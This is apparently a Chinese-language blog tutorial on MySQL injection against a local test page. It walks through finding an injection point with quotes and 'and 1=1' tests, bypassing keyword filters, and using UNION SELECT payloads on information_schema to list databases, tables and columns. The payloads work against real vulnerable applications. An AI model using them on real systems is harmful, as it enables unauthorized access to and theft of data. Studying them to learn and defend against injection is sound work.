---
title: mysql注入
date: 2016-12-01T23:11:44+08:00
draft: false
toc: true
comments: true
aliases:
  - /detail/31
  - /detail/31/
tags:
  - sql
---

### 0、样例链接

http://127.0.0.1/sql.php?id=1

### 1、步骤

1. 查看是否存在注入点
2. 使用`union`sql关键字来获取数据
3. 通过查询information_schema数据库元数据如存在什么数据库、什么表、什么数据
4. 联合union和select获取数据
5. 若存在sql关键字检测替换可以：selselectect

### 2、查看是否存在注入点

#### （1）添加单引号`'`

http://127.0.0.1/sql.php?id=1' 报错
原理：

```sql
select * from user where id=1'
```

#### （2）添加 `and 1=1` `' and '1'='1`、和 `and 1=2`、 //返回不同页面

* http://127.0.0.1/sql.php?id=1 and 1=1

原理：

```sql
select * from user where id=7 and 1=1;
```

* http://127.0.0.1/sql.php?id=1 and 1=2

原理：

```sql
select * from user where id=7 and 1=2;
```

* http://127.0.0.1/sql.php?username=b' and '1'='1

原理：

```sql
#正常语句
select * from user where username='b';
注入后语句
select * from user where username='b' and '1'='1';
```

#### （3）使用`or 2>1`和`or 1>2`返回不同页面

略

### 3、查看`union`查看`information_schema`数据库

#### （1）union试探

http://127.0.0.1/sql.php?id=7 union select 1, 'a', 1, 1, 1
原理：

```sql
select * from user where id=7 union select 1, 'a', 1, 1, 1;
```

#### （2）查看有几个数据库

http://127.0.0.1/sql.php?id=7 union select 1,SCHEMA_NAME, 1, 1, 1 from  information_schema.SCHEMATA

```sql
select * from user where id=7 union select 1,SCHEMA_NAME, 1, 1, 1 from  information_schema.SCHEMATA;
```

#### （3）查看数据库中有几张表

查看test数据库表信息
http://127.0.0.1/sql.php?id=7 union select 1,TABLE_NAME, 1, 1, 1 from  information_schema.TABLES where TABLE_SCHEMA='test'

原理

```sql
select * from user where id=7 union select 1,TABLE_NAME, 1, 1, 1 from  information_schema.TABLES where TABLE_SCHEMA='test';
返回
+----+----------+------+------+--------+
| id | username | age  | sex  | salary |
+----+----------+------+------+--------+
|  7 | b        |   18 | 3    |   NULL |
|  1 | user     |    1 | 1    |   1.00 |
+----+----------+------+------+--------+
```

#### （4）查看表中的字段

查看test数据库的user表的字段
http://127.0.0.1/sql.php?id=7 union select 1,COLUMN_NAME, 1, 1, 1 from  information_schema.COLUMNS where TABLE_SCHEMA='test' and TABLE_NAME='user'
原理

```sql
select * from user where id=7 union select 1,COLUMN_NAME, 1, 1, 1 from  information_schema.COLUMNS where TABLE_SCHEMA='test' and TABLE_NAME='user';
```

### 4、查看指定表的数据即可

略，类似上
